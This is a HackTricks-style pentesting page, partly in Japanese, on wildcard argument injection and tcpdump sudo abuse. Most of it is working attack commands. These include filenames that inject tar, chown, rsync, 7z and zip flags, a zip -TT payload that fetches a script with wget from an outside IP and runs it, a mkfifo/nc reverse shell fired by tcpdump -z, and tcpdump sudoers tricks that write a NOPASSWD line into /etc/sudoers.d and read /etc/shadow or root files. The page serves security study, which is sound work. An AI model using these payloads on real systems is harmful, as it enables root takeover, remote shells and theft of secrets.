# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** は、特権スクリプトが `tar`, `chown`, `rsync`, `zip`, `7z`, … のような Unix バイナリを引用符なしのワイルドカード `*` で実行する場合に発生します。  
> シェルはバイナリを実行する**前に**ワイルドカードを展開するため、作業ディレクトリにファイルを作成できる攻撃者は、ファイル名を `-` で始まるよう作成してそれらがデータではなく**オプション**として解釈されるようにし、任意のフラグやコマンドを実質的に密輸できます。  
> このページは、2023–2025年の最も有用なプリミティブ、最近の研究、最新の検知をまとめたものです。

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
後で root が次のようなコマンドを実行すると:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` が注入され、*すべての* 一致するファイルが `/root/secret``file` の所有権/パーミッションを継承するようになります。

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn)（複合攻撃）。
詳しくは古典的な DefenseCode の論文も参照してください。

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** 機能を悪用して任意のコマンドを実行する：
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
たとえば root が `tar -czf /root/backup.tgz *` を実行すると、`shell.sh` が root として実行されます。

### bsdtar / macOS 14+

最近の macOS 上のデフォルトの `tar`（`libarchive` に基づく）は `--checkpoint` を*実装していません*が、外部圧縮プログラムを指定できる **--use-compress-program** フラグを使えば code-execution を達成できます。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
権限のあるスクリプトが `tar -cf backup.tar *` を実行すると、`/bin/sh` が起動します。

---

## rsync

`rsync` は `-e` や `--rsync-path` で始まるコマンドラインフラグを使って、リモートのシェルやリモートバイナリを上書きできます:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
もし root が後でディレクトリを `rsync -az * backup:/srv/` でアーカイブすると、注入したフラグがリモート側であなたのシェルを起動します。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

特権スクリプトがワイルドカードの前に *防御的に* `--` を付けて（オプション解析を止めるため）も、7-Zip フォーマットはファイル名の先頭に `@` を付けることで **ファイルリストファイル** をサポートします。これをシンボリックリンクと組み合わせると、*exfiltrate arbitrary files* できます:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
もし root が次のようなものを実行すると:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip は `root.txt`（→ `/etc/shadow`）をファイルリストとして読み込もうとし、処理を中止して **その内容を stderr に出力します**。

---

## zip

アプリケーションがユーザー制御のファイル名を `zip` に渡す場合（ワイルドカード経由、または `--` なしで名前を列挙する場合）には、非常に実用的なプリミティブが2つ存在します。

- RCE via test hook: `-T` は “test archive” を有効にし、`-TT <cmd>` はテスタを任意のプログラムに置き換えます（長形式: `--unzip-command <cmd>`）。`-` で始まるファイル名を注入できる場合、ショートオプションの解析が機能するようにフラグを別々のファイル名に分割してください:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
注意
- Do NOT try a single filename like `'-T -TT <cmd>'` — 短いオプションは文字ごとに解析され、失敗します。示したようにトークンを分けて使用してください。
- アプリによってファイル名からスラッシュが取り除かれる場合は、ホスト/IP から取得（デフォルトパス `/index.html`）し、`-O` でローカルに保存してから実行してください。
- `-sc`（処理された argv を表示）や `-h2`（詳細ヘルプ）で解析をデバッグして、トークンがどのように消費されているかを確認できます。

例（zip 3.0 のローカル動作）:
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Webレイヤーが`zip`のstdout/stderrをエコーする場合（単純なラッパーではよくある）、`--help`のような注入されたフラグや不正なオプションによるエラーがHTTPレスポンスに現れ、コマンドライン注入の確認とペイロード調整に役立つ。

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| バイナリ | 悪用するフラグ | 効果 |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | ファイル内容の読み取り |
| `flock` | `-c <cmd>` | コマンド実行 |
| `git`   | `-c core.sshCommand=<cmd>` | git over SSH経由でのコマンド実行 |
| `scp`   | `-S <cmd>` | sshの代わりに任意プログラムを起動 |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

制限されたシェルやベンダー製のラッパーが、ユーザー制御のフィールド（例: "file name" パラメータ）を厳密なクオート/検証なしに連結して`tcpdump`コマンドラインを組み立てる場合、追加の`tcpdump`フラグをすり込むことができる。`-G`（時間ベースのローテーション）、`-W`（ファイル数の制限）、および`-z <cmd>`（ローテート後のコマンド）の組み合わせにより、tcpdumpを実行するユーザー（アプライアンスではしばしばroot）として任意のコマンド実行が可能になる。

Preconditions:

- `tcpdump`に渡される`argv`を影響できる（例: `/debug/tcpdump --filter=... --file-name=<HERE>` のようなラッパー経由）。
- ラッパーがファイル名フィールドの空白や`-`で始まるトークンをサニタイズしない。

Classic PoC (executes a reverse shell script from a writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
- `-G 1 -W 1` は最初に一致したパケットの後に即時ローテートを強制します。
- `-z <cmd>` は各ローテーションごとに post-rotate コマンドを1回実行します。多くのビルドは `<cmd> <savefile>` を実行します。もし `<cmd>` がスクリプト/インタプリタであれば、引数の扱いがあなたのペイロードに合っていることを確認してください。

No-removable-media variants:

- ファイルを書き込むための他のプリミティブ（例: 出力リダイレクトを許す別のコマンドラッパー）がある場合、スクリプトを既知のパスに置き、プラットフォームのセマンティクスに応じて `-z /bin/sh /path/script.sh` または `-z /path/script.sh` をトリガーします。
- 一部のベンダーラッパーは攻撃者が制御できる場所にローテートします。ローテート先パスに影響を与えられる（symlink/directory traversal）なら、外部メディアなしで完全に制御できるコンテンツを実行するよう `-z` を誘導できます。

---

## sudoers: tcpdump with wildcards/additional args → 任意の書き込み/読み取り と root

非常に一般的な sudoers のアンチパターン：
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
問題点
- `*` glob と permissive patterns は最初の `-w` 引数のみを制約する。`tcpdump` は複数の `-w` オプションを受け付け、最後のものが有効になる。
- ルールは他のオプションを固定していないため、`-Z`、`-r`、`-V` などが許可される。

基本手法
- 2番目の `-w` で宛先パスを上書きする（最初の `-w` は sudoers を満たすだけ）:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal: 最初の `-w` 内で制約されたツリーから脱出するために:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 出力の所有者を `-Z root` で強制する（任意の場所にroot所有のファイルを作成します）:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 加工したPCAPを`-r`でリプレイして任意のコンテンツを書き込む（例: sudoersに行を追加する）:

<details>
<summary>正確なASCIIペイロードを含むPCAPを作成し、rootとして書き込む</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>`（savefiles のリストを解釈します）。エラー診断はしばしば行をエコーして、内容をleakします:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## 参考資料

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
